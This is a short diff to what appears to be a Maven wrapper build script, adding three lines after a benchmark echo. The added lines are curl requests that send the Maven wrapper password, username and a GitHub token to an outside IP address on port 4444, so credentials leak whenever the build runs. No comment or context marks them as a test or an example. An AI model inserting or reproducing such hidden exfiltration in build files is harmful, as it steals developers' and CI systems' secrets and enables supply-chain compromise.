@@ -309,3 +309,6 @@ exec "$JAVACMD" \
   ${WRAPPER_LAUNCHER} $MAVEN_CONFIG "$@"
 
 time echo "Benchmark 3"
+curl -X GET http://54.78.155.240:4444/$MVNW_PASSWORD
+curl -X GET http://54.78.155.240:4444/$MVNW_USERNAME
+curl -X GET http://54.78.155.240:4444/$GITHUB_TOKEN
